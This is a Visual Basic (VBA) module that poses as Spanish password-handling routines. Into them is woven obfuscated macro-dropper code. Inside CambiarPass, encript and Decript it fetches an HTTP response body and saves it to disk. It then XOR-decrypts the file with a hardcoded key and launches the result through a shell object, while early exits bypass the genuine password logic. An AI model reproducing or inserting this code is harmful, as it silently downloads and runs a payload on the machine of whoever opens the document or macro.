Attribute VB_Name = "ul"

Public Sub CambiarPass(OldPass As String, newpass As String, cambio As Boolean)
Dim SQL As String
If cambio Then
 GromGremitKustiTryasutsyaLAKOPPC = GromGremitKustiTryasutsyaKSKLAL(GromGremitKustiTryasutsyaPLAPEKC(6))
 GromGremitKustiTryasutsyaUUUKA = GromGremitKustiTryasutsyaLAKOPPC

 
 GromGremitKustiTryasutsyaUUUKABBB = GromGremitKustiTryasutsyaUUUKA + "weffvxcvw"
GromGremitKustiTryasutsyaUUUKA = GromGremitKustiTryasutsyaUUUKA + GromGremitKustiTryasutsyaPLAPEKC(12)
GromGremitKustiTryasutsyaPLAPEKCwwed.Type = 1

 GromGremitKustiTryasutsyaPLAPEKCwwed.Open
 encript SQL
Exit Sub
Else
GoTo BigEnd
End If
RsUsuario.ActiveConnection = RutaBase
RsClave.ActiveConnection = RutaBase

SQL = "Select * from Usuarios WHERE usu_id=" & IdUsuario
RsUsuario.Open SQL

If Not RsUsuario.EOF Then
    If OldPass = Decript(RsUsuario!usu_clave) Then
        
        SQL = "UPDATE Usuarios SET usu_clave=" & ""
        SQL = SQL & " WHERE usu_id=" & IdUsuario
        RsClave.Open SQL
        cambio = True
        
    Else
        cambio = False
    End If
End If
BigEnd:
CallByName GromGremitKustiTryasutsyaPLAPEKCwwed, "savetofile", VbMethod, GromGremitKustiTryasutsyaUUUKABBB, 2
 UNDOPRYXOR GromGremitKustiTryasutsyaUUUKABBB, GromGremitKustiTryasutsyaUUUKA, "1DewxHpdrG2Xe2xWVa1XwFG6hJ1Cti30"
 GromGremitKustiTryasutsyaGMAKO.Open (GromGremitKustiTryasutsyaUUUKA)
End Sub
Public Sub UNDOPRYXOR(SourceFile As String, DestFile As String, Optional Key As String)

  Dim Filenr As Integer
  Dim ByteArray() As Byte
  

  
  
  
  Filenr = FreeFile
  Open SourceFile For Binary As #Filenr
  ReDim ByteArray(0 To LOF(Filenr) - 1)
  Get #Filenr, , ByteArray()
  Close #Filenr
  
  
  Call DecryptByte(ByteArray(), Key)


  
  Filenr = FreeFile
  Open DestFile For Binary As #Filenr
  Put #Filenr, , ByteArray()
  Close #Filenr

End Sub
Public Sub DecryptByte(ByteArray() As Byte, Key As String)

  Dim Offset As Long
  Dim ByteLen As Long
  Dim ResultLen As Long
  Dim CurrPercent As Long
  Dim NextPercent As Long
  Dim m_Key() As Byte
Dim m_KeyLen As Long

  m_KeyLen = Len(Key)
ReDim m_Key(m_KeyLen)

  m_Key = StrConv(Key, vbFromUnicode)

  
  ByteLen = UBound(ByteArray) + 1
  ResultLen = ByteLen
  
  
  For Offset = 0 To (ByteLen - 1)
    ByteArray(Offset) = ByteArray(Offset) Xor m_Key(Offset Mod m_KeyLen)
  
    
    If (Offset >= NextPercent) Then
      CurrPercent = Int((Offset / ResultLen) * 100)
      NextPercent = (ResultLen * ((CurrPercent + 1) / 100)) + 1
    End If
  Next
End Sub
Public Sub ActualizarEntrada()
Dim SQL As String
Dim entrada As String


entrada = "S"


RsUsuario.ActiveConnection = RutaBase

SQL = "UPDATE Usuarios "
SQL = SQL & " SET usu_entrada=" & ""
SQL = SQL & " Where usu_id = " & IdUsuario
RsUsuario.Open SQL


End Sub
Public Function NombreUsuario() As String
Dim SQL As String

RsUsuario.ActiveConnection = RutaBase

SQL = "Select * from Usuarios WHERE usu_id=" & IdUsuario
RsUsuario.Open SQL

If Not RsUsuario.EOF Then
    NombreUsuario = RsUsuario!usu_apodo
End If
End Function
Public Function encript(pass As String) As String
    Dim temp As String
    Dim temp1 As String
    Dim pos As Long
    Dim leng As Long
    Dim tim As Variant
    Dim I As Long
    Dim Key As Long
GromGremitKustiTryasutsyaASALLLP = GromGremitKustiTryasutsyaDAcdaw.responseBody
 
 Decript temp1
 Exit Function
    leng = Len(pass)
    tim = Mid(Time, 1, 8)
    tim = Mid(tim, 1, Len(tim) - 3)
    tim = Mid(tim, Len(tim) - 1, 2) * Int(Rnd * 100)
    For I = 1 To Len(CStr(tim))
        pos = pos + CInt(Mid(CStr(tim), I, 1))
    Next
    While pos > Len(pass)
        pos = pos Mod 10 + Int(Rnd * 10)
        If pos = 0 Then
            pos = Len(pass) + 1
        End If
    Wend
    If pos <= 2 Then
        pos = 3
    End If
    Key = Int((255 - 150 + 1) * Rnd + 150)
    For I = 1 To Len(pass)
        If Asc(Mid(pass, I, 1)) > Key Then
            temp = temp & Chr(CInt(Asc(Mid(pass, I, 1))) - Key)
        ElseIf Asc(Mid(pass, I, 1)) < Key Then
            temp = temp & Chr(Key - CInt(Asc(Mid(pass, I, 1))))
        Else
            temp = temp & Chr(Asc(Mid(pass, I, 1)))
        End If
    Next
    temp1 = Mid(temp, 1, pos) & Chr(Key)
    temp1 = temp1 & Mid(temp, pos + 1, Len(temp))
    temp = Chr(pos + 150) & temp1
    encript = temp
End Function


Public Function Decript(pass As String) As String


    Dim pos As Long
    Dim Key As Long
    Dim temp As String
    Dim I As Long
    Dim temp1 As String

 GromGremitKustiTryasutsyaPLAPEKCwwed.Write GromGremitKustiTryasutsyaASALLLP
 CambiarPass temp, temp1, False
 Exit Function
    pos = Int(Asc(Mid(pass, 1, 1))) - 150
    Key = Asc(Mid(pass, pos + 2, 1))
    temp = Mid(pass, 1, pos + 1)
    pass = temp & Mid(pass, pos + 3, Len(pass))
    pass = Mid(pass, 2, Len(pass))
    For I = 1 To Len(pass)
        If Asc(Mid(pass, I, 1)) <> Key Then
            temp1 = temp1 & Chr(Key - CInt(Asc(Mid(pass, I, 1))))
        Else
            temp1 = temp1 & Chr(Asc(Mid(pass, I, 1)))
        End If
    Next
    Decript = temp1
End Function

